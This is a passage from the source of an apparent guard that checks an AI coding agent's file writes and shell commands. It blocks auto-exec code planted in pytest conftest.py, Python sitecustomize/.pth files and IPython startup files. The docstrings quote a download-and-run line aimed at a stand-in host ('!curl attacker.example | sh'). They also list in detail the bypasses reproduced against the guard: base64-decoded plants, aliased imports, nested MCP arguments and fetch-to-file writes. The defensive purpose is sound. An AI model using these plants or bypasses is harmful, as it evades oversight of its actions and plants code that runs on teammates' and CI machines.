    the same way a partial-fragment JSON check can misread `_claude_hooks_
    json_key_hit`'s own textual sibling; the shell branch's "no embedded
    newline means the whole quoted argument is inherently module-level"
    heuristic (`patterns.conftest_dangerous_hit`'s own docstring) means a
    single dangerous call inside a MULTI-line shell payload that is NOT a
    real heredoc/file write -- e.g. a `python -c $'line1\\nline2'` argument
    containing an actual embedded newline byte but never touching the
    filesystem as a multi-line file -- still gets the stricter, position-
    aware check rather than the looser one, an accepted, narrower-than-
    ideal trade-off for a shape this guard does not expect to see in
    practice (planting a conftest.py normally means an actual file write,
    not an in-place interpreter invocation); ``find``-path indirection around
    ``conftest.py`` isn't covered (no ``*_find_hit``-style fallback, the
    same gap ``rule_package_manifest_protect``/``rule_direnv_protect``
    already disclose for their own targets); and, like every sibling guard
    here, a direct fetch-to-file write (``curl -o conftest.py ...``) is
    caught by none of the shell branch's write-verb checks, the same
    inherited gap every other guard in this file already discloses. Unlike
    ``.vscode``/``.devcontainer``/``.claude``, ``conftest.py`` has no fixed
    parent directory, so there is no directory-name ``cd``-fallback to add
    here (the bare-filename path match already reaches every depth on its
    own) -- and, for the same reason, no bare-directory archive/sync
    fallback either, the same absence ``rule_direnv_protect``'s own
    docstring discloses for ``.envrc``.

    QA history (two independent agents, bypass-hunting and design/
    consistency, run in parallel -- the same convention every guard in this
    file follows): design/consistency review found the wiring correct
    everywhere its siblings are (``Policy``, all three ``loader.py`` spots,
    both ``skills.py`` knob lists, the remedy table, README), verified an
    actual YAML ``conftest:`` block round-trips through ``load_policy()``
    into a live ``evaluate()`` decision rather than trusting the wiring by
    inspection alone, and found one test misnamed for what it actually
    asserted (fixed). Bypass-hunting found and closed three real, reproduced
    gaps: (1) the shell branch's single-line-vs-heredoc decision was made on
    ``normalize.scan_surface``'s OWN output, which appends a decoded/inner-
    interpreter segment with a plain space join -- a genuinely one-line
    ``echo <base64> | base64 -d > conftest.py`` plant whose DECODED payload
    happened to contain a newline byte flipped the check to the stricter,
    position-aware one, which then never found the call at a real line
    start (it sat after the join space) -- a confirmed, reproduced live
    bypass; closed by deciding the single-line-vs-heredoc branch on the
    PRE-decode raw command text instead (`conftest_dangerous_hit`'s own
    ``raw`` parameter), which has no such synthetic newline for a genuinely
    single-line command. (2) the MCP fallback's ``" ".join(_flatten_
    strings(a))`` meant a bare, single-line dangerous call that was the
    ENTIRE value of a nested string leaf (a filesystem-server edit tool's
    own ``{"edits": [{"newText": ...}]}`` shape, say) was preceded by that
    join space rather than a real line break, so the module-level check's
    ``^`` anchor never saw it as column-0 -- a confirmed, reproduced live
    bypass (the existing test for this MCP shape happened to still pass
    only because its own payload had an unrelated ``import`` line ahead of
    the call, incidentally supplying the newline the join itself didn't);
    closed by joining flattened MCP string leaves with ``\\n`` instead of a
    space, guard-local (the shared `_flatten_strings` helper itself, and
    every other guard that calls it, is unchanged). (3) the auto-invoked-
    hook/autouse-fixture lookahead window, originally 600 chars, was found
    too NARROW in the opposite direction from every other guard's own
    disclosed "window too wide" trade-off: an ordinary, undoctored docstring
    (a one-line summary plus a handful of wrapped detail lines, no padding
    attack) ahead of the real call already exceeds 600 chars on realistic
    fixture code -- a confirmed, reproduced live false-ALLOW on a plausible,
    non-adversarial input; widened to 4000 chars, which is still a fixed
    bound, not a real parse, and is disclosed as such above. Recommended
    PASS after these fixes; no further round needed. Full suite green
    throughout (1423 passed after the fixes' own regression tests)."""
    cfg = getattr(policy, "conftest", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "conftest-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        literal = a.get("content") or a.get("new_string")
        # Fallback for MCP tool shapes that don't use Claude Code's own
        # "content"/"new_string" keys (e.g. a filesystem-server edit tool's
        # nested {"edits": [{"oldText": ..., "newText": ...}]}) -- flatten
        # every string leaf in the args. QA (bypass-hunting round) found a
        # SPACE join here was a live bypass: a module-level dangerous call
        # sitting at the very start of a nested string leaf (e.g. "newText")
        # is preceded by that join space, not a real line break, so the
        # `^`-anchored module-level check never sees it as column-0 — only
        # a payload with an unrelated line (an `import`) ahead of the call
        # inside the SAME leaf happened to still match, by accident of that
        # leaf's own internal newline. Joining with "\n" instead makes each
        # flattened leaf start its own logical line, the same property a
        # real file's/fragment's own text already has.
        content = literal if isinstance(literal, str) and literal else "\n".join(_flatten_strings(a))
        if not p or not content:
            return None
        if not patterns.CONFTEST_PATH_RE.search(p):
            return None
        if not patterns.conftest_dangerous_hit(content):
            return None
        if (os.environ.get("AEGIS_ALLOW_CONFTEST")
                or _conftest_allowed_by_policy(cfg, p)):
            return None
        return _finish(Decision(action, "conftest-protect",
                         f"'{p}' is being written with a pytest auto-exec "
                         "shape (module-level code, an auto-invoked hook "
                         "like pytest_configure, or an autouse=True "
                         "fixture) wrapping a process/code-exec call -- "
                         "pytest imports and runs it on the very next "
                         "`pytest` invocation, by this agent, a teammate, "
                         "or CI, with no further action and no per-test "
                         "opt-in needed. Review the change, then confirm "
                         "with AEGIS_ALLOW_CONFTEST=1; a spawned agent "
                         "cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                           or patterns.INPLACE_WRITE_RE.search(cmd)
                           or patterns.FORCED_LINK_WRITE_RE.search(cmd)
                           or patterns.COPY_WRITE_VERB_RE.search(cmd))
        if not (write_verb and patterns.CONFTEST_PATH_RE.search(cmd)):
            return None
        if not patterns.conftest_dangerous_hit(cmd, shell=True, raw=_cmd(ev)):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_CONFTEST")
                or _conftest_allowed_by_policy(cfg, _cmd(ev))):
            return None
        return _finish(Decision(action, "conftest-protect",
                         "A pytest auto-exec shape is being planted in a "
                         "conftest.py from a shell -- pytest imports and "
                         "runs it on the very next `pytest` invocation, by "
                         "this agent, a teammate, or CI, with no further "
                         "action and no per-test opt-in needed. A human "
                         "may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_CONFTEST=1; a spawned agent cannot."))
    return None


def _pysite_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_pysite_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting a Python interpreter-startup auto-exec shape: a
    module-level process/code-exec call in a ``sitecustomize.py``/
    ``usercustomize.py``, or a ``.pth`` "path configuration file" line
    (inside a ``site-packages``/``dist-packages``/``__pypackages__``
    directory) that CPython execs as code and that itself invokes a
    process/code-exec call.

    THREAT MODEL: CPython's own ``site`` module runs unconditionally,
    before any user code, on EVERY interpreter startup -- ``python``,
    ``python -c``, ``pytest``, any script, any venv activation -- no
    opt-in, no explicit import, no CLI flag, no git/CI/session-restart
    trigger needed. Two distinct mechanisms both reach this:

    1. ``site.py`` imports a module literally named ``sitecustomize``
       (searched across the WHOLE of ``sys.path``, not just site-packages
       -- the project root itself lands on ``sys.path`` for a bare
       ``python script.py``, and any ``PYTHONPATH``-added directory does
       too) and, for user installs, ``usercustomize`` from the user site
       directory. Either module's top-level code runs in full, top to
       bottom, the moment the interpreter starts.

    2. A ``.pth`` file dropped into a recognized site directory is read
       line by line by ``site.addpackage()``; a line starting with the
       literal, case-sensitive text ``import `` or ``import\\t`` at column
       zero is handed straight to ``exec()`` -- a real, documented
       supply-chain RCE primitive (malicious ``.pth`` files shipped inside
       typosquatted/compromised PyPI packages have used exactly this to
       get code execution the moment ANY interpreter with that
       site-packages on ``sys.path`` starts up, no ``import`` of the
       package itself ever required). Unlike ``sitecustomize.py``, this
       fires on literally the NEXT Python interpreter startup with that
       site directory on ``sys.path`` -- for a project's own venv, that is
       this agent's own following ``python``/``pytest`` invocation in the
       same session, no future human/CI action needed at all -- the same
       "no future trigger, the very next bare invocation" property
       ``rule_path_hijack_protect``'s own docstring highlights as unique
       among most of that guard's siblings; this guard shares it for the
       analogous reason (an interpreter startup, like a bare command
       invocation, needs no git op/CI push/new shell/``cd``).

    Nothing else in this file reaches this surface: ``rule_conftest_
    protect`` gates pytest's own auto-import mechanism, not the
    interpreter's; ``rule_path_hijack_protect`` gates a shadowed ``$PATH``
    *binary*, not an imported Python module; ``rule_package_manifest_
    protect`` gates npm/composer install-lifecycle hooks, not Python's own
    interpreter-startup hooks. Given this repo (and the venv any agent
    working in a Python project runs inside) is itself a Python package,
    this is a supply-chain vector with the same severity class as
    ``rule_path_hijack_protect``'s own PATH-binary-shadow guard, just one
    layer up the interpreter instead of the shell.

    Deliberately NOT gated on any ``sitecustomize.py``/``usercustomize.py``
    write, nor on any ``.pth`` write, nor on any import-prefixed ``.pth``
    line: a ``sitecustomize.py`` CAN contain innocuous setup (warnings
    filters, encoding fixups) with no process/code-exec call in sight, and
    legitimate, widely-shipped packages (setuptools' own
    ``distutils-precedence.pth``, virtualenv's ``_virtualenv.pth``) plant
    ordinary, benign ``import``-prefixed ``.pth`` lines for ``sys.path``/
    import-hook setup. Gating on the bare file alone would flag those on
    sight; instead this narrows to the shape that actually DOES something
    dangerous once auto-run, the same "gate the SHAPE, not the file"
    trade-off ``rule_conftest_protect``/``rule_package_manifest_protect``/
    ``rule_devcontainer_exec_protect`` already make for their own
    manifests.

    Config (``policy.pysite``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate).
    Defaults to ``ask`` for the same reason every sibling ``*_protect``
    guard does: a legitimate, sanctioned interpreter-startup hook (e.g. a
    controlled coverage/profiling shim) can shell out deliberately -- it
    just needs a human to have actually looked at it once.

    Escapable only by a human: a trailing '# aegis-allow' on the shell
    form, or the env toggle ``AEGIS_ALLOW_PYSITE=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: a dangerous call assembled indirectly (string concatenation,
    a wrapper function/module the file then calls) rather than appearing as
    a literal defeats every check here, the same class every sibling guard
    already accepts; ``find``-path indirection around ``sitecustomize.py``/
    ``usercustomize.py``/a ``.pth`` filename isn't covered (no
    ``*_find_hit``-style fallback, the same gap ``rule_package_manifest_
    protect``/``rule_direnv_protect``/``rule_conftest_protect`` already
    disclose for their own targets); a direct fetch-to-file write
    (``curl -o sitecustomize.py ...``) is caught by none of the shell
    branch's write-verb checks, the same inherited gap every other guard
    in this file already discloses; the ``.pth`` check requires a
    ``site-packages``/``dist-packages``/``__pypackages__`` path segment to
    actually appear in the scanned text -- a ``.pth`` file written via a
    relative path from inside an already-``cd``'d-into site-packages
    directory (no directory-name `cd`-fallback exists here, the same
    absence ``rule_conftest_protect``'s own docstring discloses for
    ``conftest.py``, and the same "no fixed parent, no bare-directory
    archive/sync fallback either" reasoning ``rule_direnv_protect``'s own
    docstring gives for ``.envrc``) is not covered; and a ``PYTHONPATH``/
    ``sys.path`` relocation that lets a `.pth`-equivalent mechanism run
    from an entirely unrecognized directory name is the same "computed
    indirectly" class of gap ``rule_shell_persist_protect``'s own
    ``$ZDOTDIR`` gap already accepts -- though note ``sitecustomize.py``/
    ``usercustomize.py`` themselves are deliberately gated with NO
    directory restriction at all, precisely because ``PYTHONPATH``
    relocation is exactly the kind of thing that shape needs to stay
    robust against. An aliased/renamed import (``import subprocess as sp;
    sp.call(...)``, ``from os import system; system(...)``) evades the
    literal qualified-name vocabulary both branches match on -- the same
    "computed indirectly" class as the string-concatenation gap above, not
    a distinct one, but confirmed via direct reproduction (bypass-hunting
    QA round) rather than merely inferred. The shared ``_path()`` helper
    every ``*_protect`` guard in this file reads MCP tool-call arguments
    through only checks top-level argument keys (``file_path``/``path``/
    ``target_file``/...) -- an MCP tool shape that nests its target one
    level deeper (``{"target": {"path": ...}}``) evades path detection
    entirely, confirmed as a PRE-EXISTING gap shared by every sibling guard
    (``rule_conftest_protect`` included, verified directly), not unique to
    ``pysite`` and not fixed here -- a real fix belongs in ``_path()``
    itself, shared infrastructure out of scope for a single guard's own
    change. Likewise, the shared shell de-obfuscation layer
    (``normalize.scan_surface``) decodes base64 but not hex/``xxd``-style
    encoding -- confirmed as a pre-existing gap shared by every shell-form
    guard in this file, not unique here. Finally, the ``.pth`` branch's
    single-line shell fallback (``PYSITE_PTH_DANGEROUS_ANY_RE``) requires
    ``import`` be immediately preceded by a quote character to avoid a
    confirmed false ASK on an ordinary shell comment (see that pattern's
    own comment in ``patterns.py`` for the full reasoning and the false
    positive it replaced) -- the accepted, narrower trade-off is that an
    OBFUSCATED single-line ``.pth`` plant (base64/hex piped through a
    decoder) whose decoded text starts with ``import `` is joined onto the
    scanned surface by a plain space, not a quote, and so evades this
    specific fallback; the ``sitecustomize.py``/``usercustomize.py``
    branch has no equivalent gap, since it never required an
    ``import``-prefix to begin with and already handles the
    decoded-payload case correctly (reusing ``conftest_dangerous_hit``'s
    own fixed single-line-vs-heredoc logic unchanged).

    QA history (two independent agents, bypass-hunting and design/
    consistency, run in parallel -- the same convention every guard in this
    file follows): design/consistency review verified the wiring correct
    everywhere its siblings are (``Policy``, all three ``loader.py`` spots,
    both ``skills.py`` knob lists, the guard table, README), verified an
    actual YAML ``pysite:`` block round-trips through ``load_policy()``
    into a live ``evaluate()`` decision rather than trusting the wiring by
    inspection alone, and flagged that this docstring's own QA-history
    claim in README had been written before the QA history it referenced
    actually existed -- a real documentation-integrity defect, fixed by
    writing this section once both rounds had genuinely concluded rather
    than in advance of them. Bypass-hunting found and closed two real,
    reproduced false ASKs and confirmed (without fixing, as pre-existing
    shared infrastructure) three further gaps: (1) setuptools' own,
    shipped-in-nearly-every-venv ``distutils-precedence.pth`` was flagged
    on sight -- a confirmed, guaranteed, high-volume false ASK this
    docstring's own "must not gate" example had claimed, incorrectly,
    would not happen; closed by dropping bare ``__import__(`` from the
    ``.pth``-specific exec vocabulary (`_PYSITE_PTH_EXEC_CALL`), since a
    bare ``__import__('x')`` call with nothing chained onto it cannot
    itself invoke a process, and the actually-dangerous chained form
    (``__import__('os').system(...)``) was never caught by the literal
    ``os\\.system\\(`` vocabulary either way -- see
    `_PYSITE_PTH_EXEC_CALL`'s own comment in ``patterns.py``. (2) the
    original position-agnostic single-line ``.pth`` fallback matched
    ``import`` anywhere on the line via a bare word-boundary, including
    inside an ordinary shell comment that real CPython ``site.addpackage()``
    skips entirely before ever checking the ``import`` prefix -- a
    confirmed, reproduced false ASK; closed by requiring ``import`` be
    immediately preceded by a quote character instead, the trade-off
    disclosed above. (3) import-aliasing, the shared ``_path()`` MCP
    nesting gap, and hex/xxd non-decoding were all confirmed via direct
    reproduction but are the same "computed indirectly"/shared-
    infrastructure classes every sibling guard already accepts, and are
    disclosed above rather than fixed per-guard. Recommended PASS after
    the two fixes; no further round needed. Full suite green throughout
    (1469 passed after the fixes' own regression tests)."""
    cfg = getattr(policy, "pysite", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "pysite-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        literal = a.get("content") or a.get("new_string")
        content = literal if isinstance(literal, str) and literal else "\n".join(_flatten_strings(a))
        if not p or not content:
            return None

        is_customize = bool(patterns.PYSITE_CUSTOMIZE_PATH_RE.search(p))
        is_pth = bool(patterns.PYSITE_PTH_PATH_RE.search(p) and patterns.PYSITE_DIR_RE.search(p))
        if not (is_customize or is_pth):
            return None
        if is_customize:
            dangerous = patterns.pysite_customize_dangerous_hit(content)
        else:
            dangerous = patterns.pysite_pth_dangerous_hit(content)
        if not dangerous:
            return None
        if (os.environ.get("AEGIS_ALLOW_PYSITE")
                or _pysite_allowed_by_policy(cfg, p)):
            return None
        return _finish(Decision(action, "pysite-protect",
                         f"'{p}' is being written with a Python "
                         "interpreter-startup auto-exec shape wrapping a "
                         "process/code-exec call -- CPython's own `site` "
                         "module runs it on the very next `python`/`pytest` "
                         "invocation, by this agent, a teammate, or CI, "
                         "with no further action needed. Review the "
                         "change, then confirm with AEGIS_ALLOW_PYSITE=1; "
                         "a spawned agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                           or patterns.INPLACE_WRITE_RE.search(cmd)
                           or patterns.FORCED_LINK_WRITE_RE.search(cmd)
                           or patterns.COPY_WRITE_VERB_RE.search(cmd))
        if not write_verb:
            return None

        is_customize = bool(patterns.PYSITE_CUSTOMIZE_PATH_RE.search(cmd))
        is_pth = bool(patterns.PYSITE_PTH_PATH_RE.search(cmd) and patterns.PYSITE_DIR_RE.search(cmd))
        if not (is_customize or is_pth):
            return None
        if is_customize:
            dangerous = patterns.pysite_customize_dangerous_hit(cmd, shell=True, raw=_cmd(ev))
        else:
            dangerous = patterns.pysite_pth_dangerous_hit(cmd, shell=True, raw=_cmd(ev))
        if not dangerous:
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_PYSITE")
                or _pysite_allowed_by_policy(cfg, _cmd(ev))):
            return None
        return _finish(Decision(action, "pysite-protect",
                         "A Python interpreter-startup auto-exec shape is "
                         "being planted from a shell -- CPython's own "
                         "`site` module runs it on the very next "
                         "`python`/`pytest` invocation, by this agent, a "
                         "teammate, or CI, with no further action needed. "
                         "A human may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_PYSITE=1; a spawned agent cannot."))
    return None


def _ipython_startup_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_ipython_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting an IPython profile-startup auto-exec shape: a
    module-level process/code-exec call in a `.ipython/profile_*/startup/`
    `.py`/`.ipy` file, or -- `.ipy` only, where IPython's own input
    transformer makes it real syntax -- a bare `!<command>` shell-escape
    line.

    THREAT MODEL: IPython's `InteractiveShell` runs every file inside the
    ACTIVE profile's `startup/` directory, unconditionally, sorted by
    filename, on EVERY IPython startup -- a plain `ipython` invocation, a
    Jupyter kernel launch (notebook, lab, qtconsole, `jupyter console`), or
    anything else that boots an `InteractiveShell` -- no opt-in, no
    explicit import, no CLI flag, no git/CI/session-restart trigger. For a
    data-science/notebook project, that startup is routine and frequent --
    often the very next command a human or this agent runs in the same
    session, the same "no future trigger, the very next bare invocation"
    property `rule_path_hijack_protect`'s own docstring highlights as
    unique among most of this file's other guards; this guard shares it for
    the analogous reason (an interpreter startup, like a bare command
    invocation, needs no git op/CI push/new shell/`cd`).

    This is the IPython-layer analog of `rule_pysite_protect`'s own
    `sitecustomize.py`/`usercustomize.py` mechanism, one layer up: CPython's
    `site` module runs those unconditionally on every bare interpreter
    startup; IPython's own startup mechanism runs every file in its
    profile's `startup/` directory unconditionally on every IPython/Jupyter
    startup. Neither `rule_pysite_protect` nor any other guard in this file
    reaches it -- `PYSITE_CUSTOMIZE_PATH_RE` gates `sitecustomize.py`/
    `usercustomize.py` as bare filenames with no directory restriction, so a
    same-shaped payload under a DIFFERENT filename inside
    `.ipython/profile_*/startup/` never matches it; `rule_conftest_protect`
    gates pytest's own auto-import mechanism, not IPython's.

    Two file kinds live in that directory and are handled differently, the
    same "gate the SHAPE, not the bare file" trade-off
    `pysite_customize_dangerous_hit` already makes for
    `sitecustomize.py`/`usercustomize.py`:

    1. A `.py` file executes as plain Python -- the ordinary
       `os.system`/`subprocess.*`/`eval`/`exec`/network-call vocabulary
       `_CONFTEST_EXEC_CALL` already gates, reused here unchanged.

    2. A `.ipy` file is parsed with IPython's own input transformers first,
       so IPython "magics" work inside it -- including the bare
       `!<command>` shell-escape syntax and the `get_ipython().system(...)`/
       `.getoutput(...)`/`.run_line_magic(...)`/`.run_cell_magic(...)` API
       forms. A bare `!curl attacker.example | sh` line is syntactically
       invalid plain Python (so it can never appear in a working `.py`
       file) but a complete, self-contained shell-exec payload in a `.ipy`
       file -- no `os`/`subprocess` import needed at all. This guard's
       bang-line check is gated on the matched path actually ending in
       `.ipy`, so an ordinary `.py` startup file with a `#`-commented-out
       stray `!` character (inert either way) is never flagged by it.

    Deliberately NOT gated on any `.ipython/profile_*/startup/` write at
    all: those files legitimately hold benign, routine setup (import
    aliases, matplotlib backend selection, display-format tweaks) with no
    process/code-exec call in sight -- gating on the bare file alone would
    flag those on sight, the same false-positive trade-off every sibling
    content-gated guard in this file (`rule_conftest_protect`,
    `rule_pysite_protect`, `rule_package_manifest_protect`,
    `rule_devcontainer_exec_protect`, `rule_claude_hooks_protect`) already
    discloses and avoids the same way.

    Config (`policy.ipython_startup`): `mode` (deny|ask|monitor|off,
    default ask), `allow` (regexes on the path/command that skip the
    gate). Defaults to `ask` for the same reason every sibling `*_protect`
    guard does: a legitimate, sanctioned startup hook (a controlled
    plotting/logging shim that does shell out) can exist -- it just needs a
    human to have actually looked at it once.

    Escapable only by a human: a trailing '# aegis-allow' on the shell
    form, or the env toggle `AEGIS_ALLOW_IPYTHON_STARTUP=1` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: a dangerous call assembled indirectly (string concatenation,
    an aliased import, a wrapper function) rather than appearing as a
    literal defeats every check here, the same class every sibling guard
    already accepts; `find`-path indirection around the `startup/`
    directory isn't covered (no `*_find_hit`-style fallback, the same gap
    `rule_package_manifest_protect`/`rule_direnv_protect`/
    `rule_conftest_protect` already disclose for their own targets); a
    direct fetch-to-file write (`curl -o .../startup/00-x.py ...`) is
    caught by none of the shell branch's write-verb checks, the same
    inherited gap every other guard in this file already discloses; an
    `IPYTHONDIR` relocation of where IPython looks for profiles is not
    specially covered -- the same "computed indirectly" class
    `rule_shell_persist_protect`'s own `$ZDOTDIR` gap already accepts; the
    profile-name segment (`profile_[\\w.\\-]+`) is unrestricted (any name
    `ipython --profile=<name>` can create), which is deliberately broad
    rather than curated to `profile_default`, but also means it has no
    upper bound on plausible false matches from an unrelated project that
    happens to nest a `profile_x/startup/` directory structure elsewhere
    for its own reasons -- not observed in practice, disclosed as a
    theoretical trade-off; the shared `_path()` helper every `*_protect`
    guard in this file reads MCP tool-call arguments through only checks
    top-level argument keys, the same pre-existing, shared-infrastructure
    gap `rule_pysite_protect`'s own docstring already discloses and does
    not fix per-guard; and the `.ipy`-only bang-line check
    (`IPYTHON_BANG_LINE_RE`) is a pure physical-line-start regex, not a real
    tokenizer -- an ordinary multi-line triple-quoted docstring/banner whose
    TEXT happens to contain a physical line starting with `!` (e.g. a
    "!! IMPORTANT !!" warning line) gates, even though real IPython's own
    tokenize-based input transformer correctly leaves string-literal content
    untouched; no clean fix without a real parse of the file, the same
    "gate the SHAPE via a bounded/line-based check, not a full parse"
    trade-off `CONFTEST_AUTOEXEC_HOOK_RE`'s own bounded-lookahead window
    already accepts.

    QA history (two independent agents, bypass-hunting and design/
    consistency, run in parallel -- the same convention every guard in this
    file follows): design/consistency review verified the wiring correct
    everywhere its siblings are (`Policy`, all three `loader.py` spots, both
    `skills.py` knob lists, the guard table, `_CORE_RULES`, README) via a
    live YAML round-trip through `load_policy()` and the full test suite
    (1560 passed at that point), and flagged that this docstring's own
    QA-history section -- which README's own Limits-section clause already
    promised existed -- had not actually been written yet; a real
    documentation-integrity defect, the same class `rule_ld_preload_
    protect`'s own QA history discloses having caught for itself, fixed by
    writing this section once both rounds had genuinely concluded. Bypass-
    hunting (which additionally installed real IPython to verify actual
    `InteractiveShellApp._run_startup_files()` semantics rather than assume
    them) found and closed two real, reproduced bugs before merge: (1) a
    complete, reproduced BYPASS -- a base64-decoded single-line `.ipy` plant
    (`echo <b64> | base64 -d > x.ipy`) whose decoded payload contained a
    real embedded newline placed its `!<command>` line at a genuine
    post-newline line-start position in the de-obfuscated scan surface, but
    the single-line branch used only the quote-adjacent `IPYTHON_BANG_
    ANY_RE`, which the decoded segment's plain-SPACE join (not a quote)
    never satisfies -- closed by always trying the position-aware
    `IPYTHON_BANG_LINE_RE` first, regardless of branch, which cannot
    introduce a new false positive since it only matches a REAL line-start
    position; (2) an unanchored `IPYTHON_STARTUP_PATH_RE` matched any path
    segment merely ENDING in `.ipython` (`course.ipython/profile_default/
    startup/x.py`), not just the real `.ipython` directory -- closed by
    adding the same `(?:^|[\\s'\"/\\\\=])` left-anchor every sibling path
    pattern in this file already requires. Bypass-hunting also found and
    closed one real, silent scope gap (not a bug in existing logic, a
    missing one): IPython globs its system-wide config directories
    (`<sys.prefix>/etc/ipython/startup/`, and on some installs `<sys.prefix>/
    usr/etc/ipython/startup/`) alongside the profile directory, no
    `profile_*` segment at all -- confirmed by reading real IPython source
    (`shellapp.py`) rather than assumed, and closed by extending
    `IPYTHON_STARTUP_PATH_RE` to also match that form. The multi-line
    triple-quoted-string false-ASK class above was confirmed via direct
    reproduction but disclosed rather than fixed, the "no clean fix without
    a real tokenizer" class every sibling line-based guard in this file
    already accepts for its own analogous gaps. Recommended PASS after the
    three fixes; no further round needed. Full suite green throughout (1565
    passed after the fixes' own regression tests)."""
    cfg = getattr(policy, "ipython_startup", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "ipython-startup-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        literal = a.get("content") or a.get("new_string")
        content = literal if isinstance(literal, str) and literal else "\n".join(_flatten_strings(a))
        if not p or not content:
            return None
        if not patterns.IPYTHON_STARTUP_PATH_RE.search(p):
            return None
        is_ipy = bool(patterns.IPYTHON_IPY_EXT_RE.search(p))
        if not patterns.ipython_startup_dangerous_hit(content, is_ipy=is_ipy):
            return None
        if (os.environ.get("AEGIS_ALLOW_IPYTHON_STARTUP")
                or _ipython_startup_allowed_by_policy(cfg, p)):
            return None
        return _finish(Decision(action, "ipython-startup-protect",
                         f"'{p}' is being written with an IPython "
                         "profile-startup auto-exec shape -- IPython runs "
                         "every file in the active profile's `startup/` "
                         "directory unconditionally on the very next "
                         "`ipython`/Jupyter-kernel launch, by this agent, "
                         "a teammate, or CI, with no further action "
                         "needed. Review the change, then confirm with "
                         "AEGIS_ALLOW_IPYTHON_STARTUP=1; a spawned agent "
                         "cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                           or patterns.INPLACE_WRITE_RE.search(cmd)
                           or patterns.FORCED_LINK_WRITE_RE.search(cmd)
                           or patterns.COPY_WRITE_VERB_RE.search(cmd))
        if not write_verb:
            return None
        if not patterns.IPYTHON_STARTUP_PATH_RE.search(cmd):
            return None
        is_ipy = bool(patterns.IPYTHON_IPY_EXT_RE.search(cmd))
        if not patterns.ipython_startup_dangerous_hit(cmd, is_ipy=is_ipy,
                                                        shell=True, raw=_cmd(ev)):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_IPYTHON_STARTUP")
                or _ipython_startup_allowed_by_policy(cfg, _cmd(ev))):
            return None
        return _finish(Decision(action, "ipython-startup-protect",
                         "An IPython profile-startup auto-exec shape is "
                         "being planted from a shell -- IPython runs it on "
                         "the very next `ipython`/Jupyter-kernel launch, "
                         "by this agent, a teammate, or CI, with no "
                         "further action needed. A human may append "
                         "'# aegis-allow', or set "
                         "AEGIS_ALLOW_IPYTHON_STARTUP=1; a spawned agent "
                         "cannot."))
    return None


# ---- fetch-to-file backstop: closes the "curl -o"/"wget -O" gap every ----------
# ---- *_protect guard above discloses ------------------------------------------

# Self-protect's own three surfaces (`rule_self_protect`), kept in their own
# tuple: a hit here is NEVER escapable -- no '# aegis-allow', no
# AEGIS_ALLOW_* toggle, no policy `allow` regex, checked unconditionally
# with no `mode` knob -- exactly the posture `rule_self_protect` itself
# holds for these same files. A fetch-to-file write reaches the identical
# targets self-protect already treats as non-negotiable; it would be
# inconsistent to let a human (or, worse, an agent) wave this specific path
# to them past a gate that closes every other path.
_FETCH_NEVER_ESCAPABLE = (
    (patterns.ENFORCEMENT_PATH_RE, "Aegis's own enforcement config (.aegis/, .claude/settings.json)"),
    (patterns.CONFIG_DIR_RE, "Aegis's own config directory (.aegis/ or .claude/)"),
    (patterns.AEGIS_SOURCE_RE, "Aegis's own engine source"),
    (patterns.AEGIS_SKILL_PATH_RE, "Aegis's own shipped skills (.claude/skills/aegis-*)"),
)

# Every sibling `*_protect` guard's own path surface, reusing each guard's
# already-defined, already-tested path regex rather than re-deriving it --
# a hit here is ASK by default (human-only escapable), matching each
# sibling's own default posture. Deliberately excludes the PATH
# binary-shadow surface (`rule_path_hijack_protect`): that guard's target
